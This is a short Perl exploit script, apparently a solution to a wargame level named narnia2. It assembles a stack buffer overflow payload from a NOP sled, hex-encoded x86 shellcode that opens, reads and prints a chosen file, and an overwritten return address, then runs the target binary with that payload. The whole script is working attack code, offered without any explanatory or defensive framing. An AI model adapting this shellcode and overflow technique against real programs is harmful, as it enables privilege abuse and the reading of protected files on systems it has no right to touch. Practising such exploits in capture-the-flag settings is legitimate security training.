#!/usr/bin/env perl

use strict;
use warnings;

my @shellcode = ("\x31", "\xc0", "\x31", "\xdb", "\x31", "\xc9", 
		 "\x31", "\xd2", "\xeb", "\x32", "\x5b", "\xb0",
		 "\x05", "\x31", "\xc9", "\xcd", "\x80", "\x89", 
		 "\xc6", "\xeb", "\x06", "\xb0", "\x01", "\x31", 
		 "\xdb", "\xcd", "\x80", "\x89", "\xf3", "\xb0", 
		 "\x03", "\x83", "\xec", "\x01", "\x8d", "\x0c", 
		 "\x24", "\xb2", "\x01", "\xcd", "\x80", "\x31", 
		 "\xdb", "\x39", "\xc3", "\x74", "\xe6", "\xb0", 
		 "\x04", "\xb3", "\x01", "\xb2", "\x01", "\xcd", 
		 "\x80", "\x83", "\xc4", "\x01", "\xeb", "\xdf", 
		 "\xe8", "\xc9", "\xff", "\xff", "\xff");

unless( $ARGV[0] && $ARGV[1] && $ARGV[2]) {
    print "Usage: ./sheller.pl [filename] [buffersize] [eip]\n";
    exit
}

my $filename =  $ARGV[0];
my $buffersize = $ARGV[1];
my $eip = $ARGV[2];

my $shelllength = scalar @shellcode + length $filename;
my $nopsize = $buffersize - $shelllength;
my $leftnop = $nopsize - 20;
my $rightnop = $nopsize - $leftnop;
my $exploit = "\x90" x $leftnop . join("", @shellcode) . $filename . "\x90" x $rightnop . $eip;
my $out = `./narnia2 $exploit`;
print $out;

